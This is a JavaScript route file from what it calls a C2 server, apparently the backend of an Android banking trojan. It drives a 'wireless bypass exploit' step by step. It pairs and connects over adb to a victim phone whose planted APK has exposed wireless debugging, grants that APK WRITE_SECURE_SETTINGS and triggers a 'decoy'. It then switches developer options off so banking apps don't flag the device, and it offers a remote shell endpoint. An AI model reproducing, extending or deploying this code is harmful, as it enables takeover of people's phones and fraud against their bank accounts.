'use strict';
/**
 * /api/bypass — Accessibility Bypass routes
 *
 * Handles the server-side ADB execution leg of the wireless bypass exploit.
 * The APK enables wireless debugging and sends pairing info → operator
 * triggers these endpoints → server runs adb commands against the device.
 *
 * Requires: `adb` binary in PATH on the C2 server.
 *           Install via: apt install adb  OR  brew install android-platform-tools
 */
const router  = require('express').Router();
const { exec: cpExec } = require('child_process');
const { promisify } = require('util');
const exec    = promisify(cpExec);
const { run, get, all } = require('../core/db');
const { devices, broadcast } = require('../core/hub');

const PKG   = 'com.seguranca.protecao';
const PERM  = 'android.permission.WRITE_SECURE_SETTINGS';

// ── ADB availability check ────────────────────────────────────────────────────
let adbPath = 'adb';
async function checkAdb() {
  try {
    const { stdout } = await exec(`${adbPath} version`, { timeout: 5000 });
    return stdout.includes('Android Debug Bridge');
  } catch {
    return false;
  }
}

// ── Safe ADB runner ───────────────────────────────────────────────────────────
async function adb(args, opts = {}) {
  const cmd = `${adbPath} ${args}`;
  try {
    const { stdout, stderr } = await exec(cmd, {
      timeout: opts.timeout || 15_000,
      env: { ...process.env },
    });
    return { ok: true, out: stdout.trim(), err: stderr.trim(), cmd };
  } catch (e) {
    return { ok: false, out: '', err: e.message, cmd };
  }
}

// ── Persist bypass session ────────────────────────────────────────────────────
async function saveSession(devId, data) {
  await run(
    `INSERT INTO bypass_sessions(dev_id, ip, adb_port, pair_port, status, data)
     VALUES(?,?,?,?,?,?)
     ON CONFLICT(dev_id) DO UPDATE SET
       ip=excluded.ip, adb_port=excluded.adb_port, pair_port=excluded.pair_port,
       status=excluded.status, data=excluded.data, updated_at=strftime('%s','now')`,
    [devId, data.ip, data.adb_port, data.pair_port, data.status,
     JSON.stringify(data)]
  );
}

// ── Ensure bypass_sessions table exists ────────────────────────────────────────
const { db } = require('../core/db');
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS bypass_sessions (
    dev_id     TEXT PRIMARY KEY,
    ip         TEXT,
    adb_port   INTEGER,
    pair_port  INTEGER,
    status     TEXT DEFAULT 'pending',
    data       TEXT DEFAULT '{}',
    created_at INTEGER DEFAULT (strftime('%s','now')),
    updated_at INTEGER DEFAULT (strftime('%s','now'))
  )`);
});

// ══════════════════════════════════════════════════════════════════════════════
//  GET /api/bypass/status — check if adb is available
// ══════════════════════════════════════════════════════════════════════════════
router.get('/status', async (req, res) => {
  const adbOk = await checkAdb();
  const sessions = await all(`SELECT dev_id, ip, adb_port, status, updated_at
                               FROM bypass_sessions ORDER BY updated_at DESC LIMIT 50`);
  res.json({ adb_available: adbOk, adb_path: adbPath, sessions });
});

// ══════════════════════════════════════════════════════════════════════════════
//  POST /api/bypass/:devId/pair
//  Body: { ip, pair_port, pairing_code }
//  Runs: adb pair <ip>:<pair_port> <code>
// ══════════════════════════════════════════════════════════════════════════════
router.post('/:devId/pair', async (req, res) => {
  const { devId }   = req.params;
  const { ip, pair_port, pairing_code } = req.body;

  if (!ip || !pair_port || !pairing_code)
    return res.status(400).json({ error: 'ip, pair_port and pairing_code required' });

  // Validate inputs — prevent shell injection
  if (!/^[\d.]+$/.test(ip) || !/^\d+$/.test(String(pair_port)) ||
      !/^\d{6}$/.test(String(pairing_code)))
    return res.status(400).json({ error: 'Invalid input format' });

  const result = await adb(
    `pair ${ip}:${pair_port} ${pairing_code}`,
    { timeout: 20_000 }
  );

  const status = (result.ok && result.out.toLowerCase().includes('success')) ? 'paired' : 'pair_failed';

  await saveSession(devId, { ip, pair_port: +pair_port, adb_port: req.body.adb_port || 5555, status });

  broadcast({ type: 'bypass_update', dev_id: devId, step: 'pair', ok: status === 'paired', out: result.out });

  res.json({ ok: status === 'paired', step: 'pair', cmd: result.cmd, out: result.out, err: result.err });
});

// ══════════════════════════════════════════════════════════════════════════════
//  POST /api/bypass/:devId/connect
//  Body: { ip, adb_port }
//  Runs: adb connect <ip>:<adb_port>
// ══════════════════════════════════════════════════════════════════════════════
router.post('/:devId/connect', async (req, res) => {
  const { devId }       = req.params;
  const { ip, adb_port } = req.body;

  if (!ip || !adb_port)
    return res.status(400).json({ error: 'ip and adb_port required' });
  if (!/^[\d.]+$/.test(ip) || !/^\d+$/.test(String(adb_port)))
    return res.status(400).json({ error: 'Invalid input format' });

  const result = await adb(`connect ${ip}:${adb_port}`, { timeout: 15_000 });
  const ok     = result.ok && (
    result.out.includes('connected') || result.out.includes('already connected')
  );

  if (ok) await saveSession(devId, { ip, adb_port: +adb_port, status: 'connected' });

  broadcast({ type: 'bypass_update', dev_id: devId, step: 'connect', ok, out: result.out });

  res.json({ ok, step: 'connect', cmd: result.cmd, out: result.out, err: result.err });
});

// ══════════════════════════════════════════════════════════════════════════════
//  POST /api/bypass/:devId/grant
//  Body: { ip, adb_port }
//  Runs: adb -s <ip>:<port> shell pm grant <pkg> <perm>
//  Then: tells the APK to confirm and activate
// ══════════════════════════════════════════════════════════════════════════════
router.post('/:devId/grant', async (req, res) => {
  const { devId }       = req.params;
  const { ip, adb_port } = req.body;

  if (!ip || !adb_port)
    return res.status(400).json({ error: 'ip and adb_port required' });
  if (!/^[\d.]+$/.test(ip) || !/^\d+$/.test(String(adb_port)))
    return res.status(400).json({ error: 'Invalid input format' });

  const target  = `${ip}:${adb_port}`;

  // Run the grant
  const grant = await adb(
    `-s ${target} shell pm grant ${PKG} ${PERM}`,
    { timeout: 15_000 }
  );

  // Verify it landed
  const verify = await adb(
    `-s ${target} shell pm check-permission ${PERM} ${PKG}`,
    { timeout: 8_000 }
  );
  const verified = verify.out.trim() === 'PERMISSION_GRANTED';

  await saveSession(devId, {
    ip, adb_port: +adb_port,
    status: verified ? 'granted' : 'grant_failed'
  });

  if (verified) {
    // Tell the APK to verify on its side and activate the decoy
    const ws = devices.get(devId);
    if (ws && ws.readyState === 1) {
      ws.send(JSON.stringify({ type: 'cmd', cmd: 'BYPASS_CONFIRM_GRANT', args: {} }));
    }
    broadcast({ type: 'bypass_update', dev_id: devId, step: 'grant', ok: true, verified });
  }

  res.json({
    ok: verified,
    step:       'grant',
    cmd:        grant.cmd,
    out:        grant.out,
    verify_out: verify.out,
    verified,
    err:        grant.err || verify.err,
  });
});

// ══════════════════════════════════════════════════════════════════════════════
//  POST /api/bypass/:devId/clean
//  Disables developer options on device so banking apps don't flag it
// ══════════════════════════════════════════════════════════════════════════════
router.post('/:devId/clean', async (req, res) => {
  const { devId }       = req.params;
  const { ip, adb_port } = req.body;

  if (!ip || !adb_port)
    return res.status(400).json({ error: 'ip and adb_port required' });
  if (!/^[\d.]+$/.test(ip) || !/^\d+$/.test(String(adb_port)))
    return res.status(400).json({ error: 'Invalid input' });

  const target = `${ip}:${adb_port}`;

  const results = await Promise.all([
    adb(`-s ${target} shell settings put global development_settings_enabled 0`),
    adb(`-s ${target} shell settings put global adb_enabled 0`),
    adb(`-s ${target} shell settings put global adb_wifi_enabled 0`),
  ]);

  // Also tell APK to run cleanup
  const ws = devices.get(devId);
  if (ws && ws.readyState === 1)
    ws.send(JSON.stringify({ type: 'cmd', cmd: 'BYPASS_CLEAN', args: {} }));

  // Disconnect this ADB session
  await adb(`disconnect ${target}`);

  await saveSession(devId, { ip, adb_port: +adb_port, status: 'cleaned' });
  broadcast({ type: 'bypass_update', dev_id: devId, step: 'clean', ok: true });

  res.json({
    ok:      true,
    step:    'clean',
    results: results.map(r => ({ cmd: r.cmd, out: r.out, ok: r.ok })),
  });
});

// ══════════════════════════════════════════════════════════════════════════════
//  POST /api/bypass/:devId/execute-all
//  Single-shot: runs pair → connect → grant in sequence
//  Body: { ip, adb_port, pair_port?, pairing_code? }
// ══════════════════════════════════════════════════════════════════════════════
router.post('/:devId/execute-all', async (req, res) => {
  const { devId }                              = req.params;
  const { ip, adb_port, pair_port, pairing_code } = req.body;

  if (!ip || !adb_port)
    return res.status(400).json({ error: 'ip and adb_port required' });
  if (!/^[\d.]+$/.test(ip) || !/^\d+$/.test(String(adb_port)))
    return res.status(400).json({ error: 'Invalid input' });

  const steps = [];
  const target = `${ip}:${adb_port}`;

  // ── Step 1: pair (if pairing code provided — API 30+) ─────────────────────
  if (pair_port && pairing_code && /^\d{6}$/.test(String(pairing_code))) {
    const r = await adb(`pair ${ip}:${pair_port} ${pairing_code}`, { timeout: 20_000 });
    steps.push({ step: 'pair', ok: r.out.toLowerCase().includes('success'), out: r.out });
    if (!steps[0].ok) {
      return res.json({ ok: false, steps, error: 'Pairing failed — check code', out: r.out });
    }
  }

  // ── Step 2: connect ────────────────────────────────────────────────────────
  const conn = await adb(`connect ${target}`, { timeout: 15_000 });
  const connOk = conn.out.includes('connected') || conn.out.includes('already connected');
  steps.push({ step: 'connect', ok: connOk, out: conn.out });
  if (!connOk) return res.json({ ok: false, steps, error: 'Connection failed', out: conn.out });

  // ── Step 3: grant ─────────────────────────────────────────────────────────
  const grant = await adb(`-s ${target} shell pm grant ${PKG} ${PERM}`, { timeout: 15_000 });
  steps.push({ step: 'grant', ok: grant.ok, out: grant.out });

  // ── Step 4: verify ────────────────────────────────────────────────────────
  const verify   = await adb(`-s ${target} shell pm check-permission ${PERM} ${PKG}`, { timeout: 8_000 });
  const verified = verify.out.trim() === 'PERMISSION_GRANTED';
  steps.push({ step: 'verify', ok: verified, out: verify.out });

  await saveSession(devId, { ip, adb_port: +adb_port, status: verified ? 'granted' : 'grant_failed' });

  if (verified) {
    const ws = devices.get(devId);
    if (ws && ws.readyState === 1)
      ws.send(JSON.stringify({ type: 'cmd', cmd: 'BYPASS_CONFIRM_GRANT', args: {} }));
    broadcast({ type: 'bypass_update', dev_id: devId, step: 'execute-all', ok: true, verified });
  }

  res.json({ ok: verified, steps, verified });
});

// ══════════════════════════════════════════════════════════════════════════════
//  GET /api/bypass/:devId/session — get saved session for this device
// ══════════════════════════════════════════════════════════════════════════════
router.get('/:devId/session', async (req, res) => {
  const row = await get(`SELECT * FROM bypass_sessions WHERE dev_id=?`, [req.params.devId]);
  res.json(row || null);
});

// ══════════════════════════════════════════════════════════════════════════════
//  POST /api/bypass/:devId/shell — run arbitrary adb shell cmd (advanced)
//  Body: { ip, adb_port, cmd }
// ══════════════════════════════════════════════════════════════════════════════
router.post('/:devId/shell', async (req, res) => {
  const { ip, adb_port, cmd } = req.body;

  if (!ip || !adb_port || !cmd)
    return res.status(400).json({ error: 'ip, adb_port and cmd required' });
  if (!/^[\d.]+$/.test(ip) || !/^\d+$/.test(String(adb_port)))
    return res.status(400).json({ error: 'Invalid input' });

  // Whitelist allowed shell commands
  const ALLOWED = [
    /^pm (grant|revoke|check-permission|list permissions)/,
    /^settings (put|get|delete) (global|secure|system)/,
    /^dumpsys accessibility/,
    /^getprop/,
    /^id$/,
    /^whoami$/,
    /^pm list packages/,
    /^cmd appops (set|get)/,
  ];

  const allowed = ALLOWED.some(re => re.test(cmd.trim()));
  if (!allowed)
    return res.status(403).json({ error: 'Command not in allowed list' });

  const target = `${ip}:${adb_port}`;
  const result = await adb(`-s ${target} shell ${cmd}`, { timeout: 12_000 });
  res.json({ ok: result.ok, out: result.out, err: result.err });
});

module.exports = router;
